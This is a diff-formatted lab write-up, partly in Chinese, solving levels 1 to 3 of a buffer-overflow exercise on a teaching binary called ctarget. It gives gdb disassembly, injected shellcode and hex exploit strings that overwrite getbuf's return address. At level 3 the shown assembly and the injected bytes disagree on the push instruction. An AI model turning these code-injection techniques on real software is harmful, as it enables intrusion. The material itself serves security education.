@@ -1,0 +1,83 @@
+Level 1
+$ gdb ctarget
+(gdb) disas getbuf
+
+Dump of assembler code for function getbuf:
+   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
+   0x00000000004017ac <+4>:     mov    %rsp,%rdi
+   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
+   0x00000000004017b4 <+12>:    mov    $0x1,%eax
+   0x00000000004017b9 <+17>:    add    $0x28,%rsp
+   0x00000000004017bd <+21>:    retq   
+End of assembler dump.
+
+
+(gdb) disas touch1
+Dump of assembler code for function touch1:
+   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
+   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
+   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
+   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
+   0x00000000004017d8 <+24>:    mov    $0x1,%edi
+   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
+   0x00000000004017e2 <+34>:    mov    $0x0,%edi
+   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
+End of assembler dump.
+
+
+30 31 32 33 34 35 36 37 38 39
+30 31 32 33 34 35 36 37 38 39
+30 31 32 33 34 35 36 37 38 39
+30 31 32 33 34 35 36 37 38 39
+c0 17 40 00 00 00 00 00
+Level 2
+ push $0x4017ec  ;address of touch2
+movq $0x59b997fa, %rdi ;cookie
+retq
+(2).生成攻击指令的字节表示
+
+$ gcc -c level2.s
+$ objdump -d level2.o > level2.d
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   68 ec 17 40 00          pushq  $0x4017ec
+   5:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
+   c:   c3                      retq
+(3).确定exploit code放置地址
+
+这里我把exploit code放在缓冲区开始的位置，使用gdb调试ctarget，执行到getbuf中第二条指令，此时%rsp为0x5561dc78。
+
+$ gdb ctarget
+(gdb) b getbuf
+(gdb) r -q
+(gdb) stepi
+(4).构造输入字符串
+
+68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3    //exploit code
+30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 //pad
+78 dc 61 55 00 00 00 00 //return address
+ Level 3
+
+
+movq $0x5561dca8, %rdi
+pushq 0x4018fa
+ret
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
+   7:   ff 34 25 fa 18 40 00    pushq  0x4018fa
+   e:   c3                      retq
+
+35 39 62 39 39 37 66 61 00
+
+
+48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3  //inject code
+30 31 32 33 34 35 36 37 38 39  //pad
+30 31 32 33 34 35 36 37 38 39
+30 31 32 33 34 35 36
+78 dc 61 55 00 00 00 00     // return address 
+35 39 62 39 39 37 66 61 00  // cookie
